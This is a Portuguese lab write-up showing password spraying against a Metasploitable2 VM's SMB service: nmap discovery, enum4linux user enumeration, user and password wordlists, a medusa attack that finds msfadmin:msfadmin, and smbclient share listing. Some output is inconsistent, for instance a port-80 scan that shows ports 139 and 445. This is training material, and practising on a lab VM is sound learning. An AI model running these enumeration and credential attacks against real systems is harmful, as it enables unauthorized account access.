
Password Spraying é uma técnica de ataque de autenticação em que o atacante tenta **uma senha comum** (ou um pequeno conjunto de senhas populares) contra muitos usuários válidos.

Diferente da força bruta tradicional (onde várias senhas são tentadas em uma única conta) o Password Spraying espalha as tentativas entre diversas contas, evitando bloqueios e dificultando a detecção por IDS e SIEM.

# 1. Identificando o alvo na rede

O primeiro passo foi realizar a identificação do alvo na rede, para isso eu precisei realizar um scan utilizando a ferramenta nmap por via de comando no terminal do Kali Linux

```shell
┌──(bazukart㉿kali)-[~]
└─$ sudo nmap -sn -PS -PA 192.168.1.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 01:46 -03
Nmap scan report for 192.168.1.1
Host is up (0.031s latency).
MAC Address: 00:EB:D8:63:C1:A8 (Mercusys Technologies)
Nmap scan report for 192.168.1.101
Host is up (0.00034s latency).
MAC Address: 08:00:27:E6:DC:6D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.1.110
Host is up.
MAC Address: FC:23:CD:4B:FF:4C (Unknown)
Nmap scan report for 192.168.1.119
Host is up (0.00019s latency).
MAC Address: A8:E2:91:86:A5:59 (Unknown)
Nmap scan report for 192.168.1.100
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 3.71 seconds
```

Aqui é possível identificar que o host `192.168.1.101` é o nosso alvo principal, por estar identificado como um equipamento vinculado ao VirtualBox

# 2. Identificando o serviço HTTP

Depois de ter descoberto o host na rede, ainda utilizarei o nmap para descobrir se o serviço `SMB` (Porta 445) está disponível no alvo que desejo atacar

```shell
┌──(bazukart㉿kali)-[~]
└─$ sudo nmap -sV -p 80 192.168.1.101 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 01:51 -03
Nmap scan report for 192.168.1.101
Host is up (0.00050s latency).

PORT   STATE SERVICE VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:E6:DC:6D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds

```

Aqui é possível visualizar que o serviço `netbios-ssn` está aberto (open) em duas portas (139 & 445), oque indica que ele está pronto para receber conexões

# 4. Enumeração de usuários (enum4linux)

O enum4linux é uma ferramenta de linha de comando, baseada em Linux e escrita em Perl, utilizada para a **enumeração de informações** de sistemas Windows e Samba (implementação Linux do protocolo SMB). É uma ferramenta essencial na fase de reconhecimento de testes de penetração e avaliações de vulnerabilidade (VAPT).

O principal objetivo do enum4linux é coletar o máximo de dados possível sobre o sistema alvo, explorando o protocolo SMB (Server Message Block), que é usado principalmente para compartilhamento de arquivos e impressão em redes Windows. A ferramenta atua como um _wrapper_ (invólucro) para diversas outras ferramentas Samba, como `rpcclient`, `smbclient`, `net` e `nmblookup`, automatizando o processo de coleta de informações.

```shell
enum4linux -a 192.168.1.101 | tee enum4linux\ 192.168.1.101.txt
# O parâmetro "-a" ativa todas as tags possíveis de enumeração
# Não é obrigatorio utilizar o "tee" mas é recomentado guardar as informações em um arquivo
```

# 5. Analise da enumeração do enum4linux

Após realizar a enumeração de informações no alvo, e obter diversos dados do sistema. Iremos buscar apenas os que condizem aos usuarios encontrados

```shell
user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]
```

A partir daqui, podemos pegar o nome de cada usuário encontrado e fazer uma WordList a partir dessas informações.

## 5.1. `Users\ metasploitable2.txt`

1. games
2. nobody
3. bind
4. proxy
5. syslog
6. user
7. www-data
8. root
9. news
10. postgres
11. bin
12. mail
13. distccd
14. proftpd
15. dhcp
16. deamon
17. sshd
18. man
19. lp
20. mysql
21. gnats
22. libuuid
23. backup
24. msfadmin
25. telnetd
26. sys
27. klog
28. postfix
29. service
30. list
31. irc
32. ftp
33. tomcat55
34. sync
35. uucp

Prosseguimos criando um arquivo de provaveis senhas:

## 5.2. `senhas.txt`

1. 123456
2. password
3. qwerty
4. msfadmin
5. admin

# 6. Iniciando o ataque

Aqui eu já ponho em pratica o uso da ferramenta `medusa` para efetuar o ataque de força bruta no serviço `SMB` do Metasploitable

```shell
┌──(bazukart㉿kali)-[~]
└─$ medusa -h 192.168.1.101 -U Users\ Metasploitable.txt -P senhas.txt -M smbnt -t 2 -T 50 | grep "SUCCESS"
```

Explicação do codigo:
- `medusa`: Indica que a ferramenta a ser utilizada será a medusa
- `-h`: Serve para identificar qual será o alvo será executado o ataque
- `192.168.1.101`: Ip do alvo
- `-U`: Indica o arquivo de usuarios (Users)
- `Users\ Metasploitable.txt`: Arquivo de usuarios
- `-P`: Indica o arquivo de senhas (Passwords)
- `senhas.txt`: Arquivo de senhas
- `-M`: Menciona qual o tipo de serviço que o ataque será executado
- `smbnt`: serviço SMB
- `-t`: Numero de threads simultâneas
- `2`: Numero de threads
- `-T`: Define quantos hosts pode podem ser testados em paralelo.
Mas como você forneceu **apenas um host**, isso praticamente não afeta aqui.
Mas se você tivesse usado:
```shell
-H hosts.txt
```
Aí sim rodaria até 50 hosts simultâneos.
- `50`: Hosts simultaneos (mas não estão em execução)

Resultado:

```shell
2025-11-28 19:41:21 ACCOUNT FOUND: [smbnt] Host: 192.168.1.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```
- Observação:
Como esse tipo de ataque tende a mostrar muitas informações, eu simplifiquei para mostrar apenas as credenciais que foram validas (`| grep "SUCCESS"`)

# 7. Analisando o ataque

```shell
┌──(bazukart㉿kali)-[~]
└─$ medusa -h 192.168.1.101 -U Users\ Metasploitable.txt -P senhas.txt -M smbnt -t 2 -T 50 | grep "SUCCESS"
2025-11-28 19:41:21 ACCOUNT FOUND: [smbnt] Host: 192.168.1.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

Aqui podemos ver que a tentativa com as credenciais:

- `User`: msfadmin
- `Password`: msfadmin

Correspondem a um sucesso em sua execução

# 8. Invadindo o alvo

Agora podemos inserir tais informações descobertas no cabeçalho do `SMB` e seguir adiante para além do ataque realizado

```shell
┌──(bazukart㉿kali)-[~/Laboratorio]
└─$ smbclient -L //192.168.1.101 -U msfadmin                    
Password for [WORKGROUP\msfadmin]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE
```

